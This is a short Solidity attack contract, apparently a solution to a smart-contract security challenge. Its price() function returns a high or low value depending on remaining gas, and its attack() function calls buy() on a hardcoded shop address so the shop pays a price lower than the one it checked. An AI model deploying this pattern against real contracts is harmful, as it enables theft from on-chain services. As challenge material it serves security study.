//SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

contract Buyer {
    address shopContractAddress = 0x229b7E69Da622096f3237927EB11cA8598c11c02;
    uint256 buyPriceHigh = 110;
    uint256 buyPriceLow = 90;

    function price() external view returns (uint256) {
        //Depending on gas left change the return value of the pricec view function.
        if (gasleft() < 40000) {
            return buyPriceLow;
        } else {
            return buyPriceHigh;
        }
    }

    function attack() external {
        //Sending 50k gas and assuming 20k gas for one transaction check for gasleft() < 40k
        shopContractAddress.call{gas: 50000}(abi.encodeWithSignature("buy()"));
    }
}
